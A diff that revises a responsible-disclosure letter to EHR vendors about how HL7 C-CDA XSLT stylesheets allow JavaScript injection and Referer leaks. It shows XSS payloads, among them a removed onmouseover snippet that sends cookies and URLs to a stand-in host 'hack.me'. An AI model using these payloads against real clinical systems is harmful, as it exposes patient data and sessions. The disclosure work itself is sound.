@@ -8,11 +8,9 @@ below reaches someone on your security team.
 
 Best,
 
-  Josh Mandel, MD
-
-  Lead Architect, SMART Platforms
-
-  Harvard Medical School / Boston Children's Hospital
+Josh Mandel, MD  
+Lead Architect, SMART Platforms  
+Harvard Medical School / Boston Children's Hospital  
 
 ---
 
@@ -21,7 +19,8 @@ Best,
 I'm writing to report a *potential security vulnerability* in the display of
 Consolidated CDA documents. To be clear, I haven't tested whether your EHR
 products are vulnerable to the issues below, but I have found that they
-*affect some production EHR systems*, and I wanted to share this report with Web-based EHR vendors privately before I describe it in public on the [SMART Platforms
+*affect some production EHR systems*, and I wanted to share this report with
+Web-based EHR vendors privately before I describe it in public on the [SMART Platforms
 blog](http://smartplatforms.org).
 
 In short, the concern has to do with the use of XSLT "stylesheets" to
@@ -39,13 +38,9 @@ time to repair it, please let me know prior to 3/20, and I can delay publication
 
 Best,
 
-  Josh Mandel, MD
-
-  Lead Architect, SMART Platforms
-
+  Josh Mandel, MD  
+  Lead Architect, SMART Platforms  
   Harvard Medical School / Boston Children's Hospital
-
-
 
 
 ### Three fundamental attacks
@@ -55,7 +50,7 @@ Many vendors appear to be using (slightly modified) versions of the
 with HL7's C-CDA release. This provides potential attackers with a highly
 visible, leveragable target.
 
-My analysis revealed at least three ways to craft a malicious C-CDA. I'll discuss both in detail:
+My analysis revealed at least three ways to craft a malicious C-CDA. I'll describe them in detail...
 
 
 #### 1. Unsanitized `nonXMLBody/text/reference/@value` can execute JavaScript
@@ -80,7 +75,7 @@ This means we can get javascript to execute if we can supply it in a reference l
 </nonXMLBody>
 ```
 
-The resulting HTML rendering would include the following dangerous snippet:
+The XSLT-output HTML rendering would include the following dangerous snippet:
 
 ```
   <iframe src="javascript:alert(window.parent.location);"></iframe>
@@ -105,38 +100,19 @@ following permissive "copy all" can be dangerous:
 What this says is: "when you find a `table` in the C-CDA document, just copy
 all of its XML attributes right into the rendered document. An attacker can use
 this to inject JavaScript in the resulting document. For example, an attacker
-could steal cookies and pass them back to an external server with: something
-like:
+could steal cookies and application state, and them back to an external server.
+
+A source C-CDA document would supply a table like:
 
 ```
-<table onmouseover="
-  var i=document.createElement('img');
-  i.style.display='none';
-  i.src='https://hack.me/from/'+
-        encodeURIComponent(document.URL)+
-        '/cookie/'+
-        encodeURIComponent(document.cookie);
-  document.body.appendChild(i);"></table>
+<table 
+   onmouseover="alert(window.parent.location);"
+   style="height: 100%; width: 100%; position: fixed; left: 0px; top: 0px;">
+</table>
 ```
 
-The resulting HTML would contain the source `table` element verbatim.
+... and the XSLT-output HTML rendering would contain the source `table` element verbatim.
 
-As written, this would only work if the user moves the mouse over what could be
-a small, isolated table in the C-CDA document. But providing a `table/@style`
-can increase the attack surface to encompass the entire page:
-
-```
-<table style="height: 100%;
-              z-index: 10;
-              width: 100%;
-              position: fixed;
-              left: 0px;
-              top: 0px;" 
-       onmouseover="[as before]" style=""></table>
-```
-
-Now the infected table covers the entire document area, so moving the mouse
-anywhere within the document will cause our code to run. 
 
 #### Unsanitized `observationMedia/value/reference/@value` can leak state via HTTP `Referer` headers
 
@@ -178,7 +154,7 @@ URL to `https://hack.me`:
 </entry>
 ```
 
-The resulting HTML would include the potentially dangerous snippet:
+The XSLT-output HTML rendering would include the potentially dangerous snippet:
 
 ```
 <img src="https://hack.me/leaked-from-image.png"></img>
